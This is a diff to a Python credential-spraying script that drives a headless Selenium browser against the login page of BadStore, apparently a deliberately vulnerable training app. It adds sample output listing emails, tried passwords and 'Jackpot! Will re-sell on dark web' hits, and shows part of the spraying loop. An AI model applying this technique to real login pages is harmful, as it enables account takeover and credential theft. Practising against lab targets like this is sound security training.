@@ -1,6 +1,42 @@
 ec2-user@kali:~$ cat headless-badstore-cred-spray.py
 #!/usr/bin/python
-
+# usage:
+#
+#ec2-user@kali:~$ python headless-badstore-cred-spray.py http://badstore-origin.cudathon.com/cgi-bin/badstore.cgi?action=loginregister
+#Ah ... badstore ... good, good
+#big@spender.com iforgot nope
+#big@spender.com time nope
+#big@spender.com love nope
+#big@spender.com hello123 nope
+#Jackpot! Will re-sell on dark web: big@spender.com money
+#big@spender.com please nope
+#itsbrett@gmail.com iforgot nope
+#itsbrett@gmail.com time nope
+#itsbrett@gmail.com love nope
+#itsbrett@gmail.com hello123 nope
+#itsbrett@gmail.com money nope
+#itsbrett@gmail.com please nope
+#Jackpot! Will re-sell on dark web: joe@supplier.com iforgot
+#joe@supplier.com time nope
+#joe@supplier.com love nope
+#joe@supplier.com hello123 nope
+#joe@supplier.com money nope
+#joe@supplier.com please nope
+#julio.tan@gmail.com iforgot nope
+#julio.tan@gmail.com time nope
+#julio.tan@gmail.com love nope
+#julio.tan@gmail.com hello123 nope
+#julio.tan@gmail.com money nope
+#julio.tan@gmail.com please nope
+#2@2.com iforgot nope
+#2@2.com time nope
+#2@2.com love nope
+#2@2.com hello123 nope
+#2@2.com money nope
+#2@2.com please nope
+#ec2-user@kali:~$
+#
+#
 import os
 import json
 import sys
@@ -38,7 +74,7 @@ for email in email_list:
         for passwd in passwd_list:
                 driver.get(target)
                 time.sleep(0.25)
-                print(driver.page_source)
+                #print(driver.page_source)
                 assert "BadStore" in driver.title
                 #assert "Python" in driver.title
                 # elem = driver.find_element_by_partial_link_text('loginregister')
